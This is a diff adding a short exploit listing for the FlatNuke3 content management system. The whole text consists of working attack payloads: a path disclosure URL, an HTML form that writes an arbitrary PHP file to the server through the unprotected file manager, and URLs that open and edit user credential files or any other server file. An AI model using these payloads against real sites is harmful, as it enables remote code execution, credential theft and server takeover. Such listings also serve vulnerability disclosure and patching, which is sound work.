@@ -1,0 +1,27 @@
+Full Path Disclosure Example:
+
+http://www.example.com/flatnuke3_path/index.php?mod=[forum_path]
+&amp;op=disc&amp;argumentname=[a_casual_char]
+---------------------------------------------------------------
+File Replace Exploit:
+
+&lt;form method=&quot;post&quot; action=&quot;http://www.example.com/flatnuke3_path/index.php?
+mod=none_filemanager&amp;amp;op=&quot;&gt;&lt;textarea id=&quot;body&quot; name=&quot;body&quot; cols=&quot;90&quot; rows=&quot;
+35&quot;&gt;
+&lt;/textarea&gt;&lt;br&gt;&lt;input value=&quot;Save&quot; type=&quot;submit&quot;&gt;&lt;input type=&quot;reset&quot;&gt;
+&lt;input name=&quot;opmod&quot; value=&quot;save&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;ffile&quot; value=&quot;[file_name].php&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;dir&quot; value=&quot;/[script_path]/[file_path]&quot; type=&quot;hidden&quot;&gt;&lt;input
+class=&quot;button&quot; onclick=&quot;history.back()&quot; value=&quot;Annulla&quot; type=&quot;button&quot;&gt;&lt;/form&gt;
+---------------------------------------------------------------
+User Credential View/Edit Exploit:
+
+http://www.example.com/flatnuke3_path/index.php?mod=none_filemanager&amp;dir=/
+[script_path]/[flatnuke3_path]/misc/fndatabase/users/&amp;ffile=[username].
+php&amp;opmod=open&amp;op=
+
+Or, for example u can view and edit a file located on the server:
+
+http://www.example.com/flatnuke3_path/index.php?mod=none_filemanager&amp;dir=/
+[script_path]/&amp;ffile=[file]&amp;opmod=open&amp;op=
+
